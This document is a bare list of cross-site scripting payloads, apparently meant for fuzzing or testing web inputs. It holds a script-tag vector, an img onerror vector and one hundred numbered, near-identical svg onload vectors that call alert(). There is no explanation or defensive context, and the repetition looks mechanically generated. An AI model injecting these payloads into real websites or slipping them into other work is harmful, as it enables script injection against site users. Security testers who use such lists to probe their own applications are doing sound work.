<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)> <!-- XSS_Vector_1 -->
<svg/onload=alert(2)> <!-- XSS_Vector_2 -->
<svg/onload=alert(3)> <!-- XSS_Vector_3 -->
<svg/onload=alert(4)> <!-- XSS_Vector_4 -->
<svg/onload=alert(5)> <!-- XSS_Vector_5 -->
<svg/onload=alert(6)> <!-- XSS_Vector_6 -->
<svg/onload=alert(7)> <!-- XSS_Vector_7 -->
<svg/onload=alert(8)> <!-- XSS_Vector_8 -->
<svg/onload=alert(9)> <!-- XSS_Vector_9 -->
<svg/onload=alert(10)> <!-- XSS_Vector_10 -->
<svg/onload=alert(11)> <!-- XSS_Vector_11 -->
<svg/onload=alert(12)> <!-- XSS_Vector_12 -->
<svg/onload=alert(13)> <!-- XSS_Vector_13 -->
<svg/onload=alert(14)> <!-- XSS_Vector_14 -->
<svg/onload=alert(15)> <!-- XSS_Vector_15 -->
<svg/onload=alert(16)> <!-- XSS_Vector_16 -->
<svg/onload=alert(17)> <!-- XSS_Vector_17 -->
<svg/onload=alert(18)> <!-- XSS_Vector_18 -->
<svg/onload=alert(19)> <!-- XSS_Vector_19 -->
<svg/onload=alert(20)> <!-- XSS_Vector_20 -->
<svg/onload=alert(21)> <!-- XSS_Vector_21 -->
<svg/onload=alert(22)> <!-- XSS_Vector_22 -->
<svg/onload=alert(23)> <!-- XSS_Vector_23 -->
<svg/onload=alert(24)> <!-- XSS_Vector_24 -->
<svg/onload=alert(25)> <!-- XSS_Vector_25 -->
<svg/onload=alert(26)> <!-- XSS_Vector_26 -->
<svg/onload=alert(27)> <!-- XSS_Vector_27 -->
<svg/onload=alert(28)> <!-- XSS_Vector_28 -->
<svg/onload=alert(29)> <!-- XSS_Vector_29 -->
<svg/onload=alert(30)> <!-- XSS_Vector_30 -->
<svg/onload=alert(31)> <!-- XSS_Vector_31 -->
<svg/onload=alert(32)> <!-- XSS_Vector_32 -->
<svg/onload=alert(33)> <!-- XSS_Vector_33 -->
<svg/onload=alert(34)> <!-- XSS_Vector_34 -->
<svg/onload=alert(35)> <!-- XSS_Vector_35 -->
<svg/onload=alert(36)> <!-- XSS_Vector_36 -->
<svg/onload=alert(37)> <!-- XSS_Vector_37 -->
<svg/onload=alert(38)> <!-- XSS_Vector_38 -->
<svg/onload=alert(39)> <!-- XSS_Vector_39 -->
<svg/onload=alert(40)> <!-- XSS_Vector_40 -->
<svg/onload=alert(41)> <!-- XSS_Vector_41 -->
<svg/onload=alert(42)> <!-- XSS_Vector_42 -->
<svg/onload=alert(43)> <!-- XSS_Vector_43 -->
<svg/onload=alert(44)> <!-- XSS_Vector_44 -->
<svg/onload=alert(45)> <!-- XSS_Vector_45 -->
<svg/onload=alert(46)> <!-- XSS_Vector_46 -->
<svg/onload=alert(47)> <!-- XSS_Vector_47 -->
<svg/onload=alert(48)> <!-- XSS_Vector_48 -->
<svg/onload=alert(49)> <!-- XSS_Vector_49 -->
<svg/onload=alert(50)> <!-- XSS_Vector_50 -->
<svg/onload=alert(51)> <!-- XSS_Vector_51 -->
<svg/onload=alert(52)> <!-- XSS_Vector_52 -->
<svg/onload=alert(53)> <!-- XSS_Vector_53 -->
<svg/onload=alert(54)> <!-- XSS_Vector_54 -->
<svg/onload=alert(55)> <!-- XSS_Vector_55 -->
<svg/onload=alert(56)> <!-- XSS_Vector_56 -->
<svg/onload=alert(57)> <!-- XSS_Vector_57 -->
<svg/onload=alert(58)> <!-- XSS_Vector_58 -->
<svg/onload=alert(59)> <!-- XSS_Vector_59 -->
<svg/onload=alert(60)> <!-- XSS_Vector_60 -->
<svg/onload=alert(61)> <!-- XSS_Vector_61 -->
<svg/onload=alert(62)> <!-- XSS_Vector_62 -->
<svg/onload=alert(63)> <!-- XSS_Vector_63 -->
<svg/onload=alert(64)> <!-- XSS_Vector_64 -->
<svg/onload=alert(65)> <!-- XSS_Vector_65 -->
<svg/onload=alert(66)> <!-- XSS_Vector_66 -->
<svg/onload=alert(67)> <!-- XSS_Vector_67 -->
<svg/onload=alert(68)> <!-- XSS_Vector_68 -->
<svg/onload=alert(69)> <!-- XSS_Vector_69 -->
<svg/onload=alert(70)> <!-- XSS_Vector_70 -->
<svg/onload=alert(71)> <!-- XSS_Vector_71 -->
<svg/onload=alert(72)> <!-- XSS_Vector_72 -->
<svg/onload=alert(73)> <!-- XSS_Vector_73 -->
<svg/onload=alert(74)> <!-- XSS_Vector_74 -->
<svg/onload=alert(75)> <!-- XSS_Vector_75 -->
<svg/onload=alert(76)> <!-- XSS_Vector_76 -->
<svg/onload=alert(77)> <!-- XSS_Vector_77 -->
<svg/onload=alert(78)> <!-- XSS_Vector_78 -->
<svg/onload=alert(79)> <!-- XSS_Vector_79 -->
<svg/onload=alert(80)> <!-- XSS_Vector_80 -->
<svg/onload=alert(81)> <!-- XSS_Vector_81 -->
<svg/onload=alert(82)> <!-- XSS_Vector_82 -->
<svg/onload=alert(83)> <!-- XSS_Vector_83 -->
<svg/onload=alert(84)> <!-- XSS_Vector_84 -->
<svg/onload=alert(85)> <!-- XSS_Vector_85 -->
<svg/onload=alert(86)> <!-- XSS_Vector_86 -->
<svg/onload=alert(87)> <!-- XSS_Vector_87 -->
<svg/onload=alert(88)> <!-- XSS_Vector_88 -->
<svg/onload=alert(89)> <!-- XSS_Vector_89 -->
<svg/onload=alert(90)> <!-- XSS_Vector_90 -->
<svg/onload=alert(91)> <!-- XSS_Vector_91 -->
<svg/onload=alert(92)> <!-- XSS_Vector_92 -->
<svg/onload=alert(93)> <!-- XSS_Vector_93 -->
<svg/onload=alert(94)> <!-- XSS_Vector_94 -->
<svg/onload=alert(95)> <!-- XSS_Vector_95 -->
<svg/onload=alert(96)> <!-- XSS_Vector_96 -->
<svg/onload=alert(97)> <!-- XSS_Vector_97 -->
<svg/onload=alert(98)> <!-- XSS_Vector_98 -->
<svg/onload=alert(99)> <!-- XSS_Vector_99 -->
<svg/onload=alert(100)> <!-- XSS_Vector_100 -->
